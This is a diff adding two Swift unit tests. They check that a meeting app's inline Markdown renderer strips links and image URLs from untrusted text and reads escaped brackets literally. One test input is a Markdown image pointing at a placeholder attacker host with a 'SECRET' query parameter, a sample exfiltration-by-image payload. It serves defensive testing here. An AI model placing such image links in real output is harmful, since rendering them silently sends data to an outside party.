@@ -195,6 +195,26 @@ final class MeetingWindowStateTests: XCTestCase {
         XCTAssertTrue(out.runs.contains { $0.inlinePresentationIntent != nil }, "bold is kept")
     }
 
+    /// A Markdown image is a link too: a third party's `![a](https://…)` must carry no `imageURL` either, or a view that
+    /// loads image attributes would fetch it on open.
+    /// Mutation: InlineMarkdown.removingLinks, delete the `imageURL` clearing -> RED.
+    func testNotesNeverCarryAnImageURL() {
+        let out = InlineMarkdown.attributed("see ![the chart](https://evil.example/p.png?d=SECRET) and [x](https://evil.example/y)")
+        XCTAssertFalse(out.runs.contains { $0.imageURL != nil }, "no run may load an image")
+        XCTAssertFalse(out.runs.contains { $0.link != nil })
+        XCTAssertTrue(String(out.characters).contains("the chart"))
+    }
+
+    /// The daemon writes every bracket of model text with a backslash (`\[` `\]`), so no link or reference can form;
+    /// the Markdown engine reads the text back as typed and makes nothing of it.
+    /// Mutation: none in the app (the escape is the daemon's, pinned in internal/meeting TestCleanLineEscapesBracketsAndReadsBackAsTyped);
+    /// a parse that ignored `\[` would show backslashes here -> RED.
+    func testEscapedBracketsReadBackAsTypedAndAreNotALink() {
+        let out = InlineMarkdown.attributed("use x\\[i\\](y) and \\[r\\]: http://example.invalid/p")
+        XCTAssertEqual(String(out.characters), "use x[i](y) and [r]: http://example.invalid/p")
+        XCTAssertFalse(out.runs.contains { $0.link != nil || $0.imageURL != nil })
+    }
+
     // MARK: Show in Finder
 
     func testShowInFinderPrefersTheMeetingsCopyThenTheFolderThenSaysSo() {
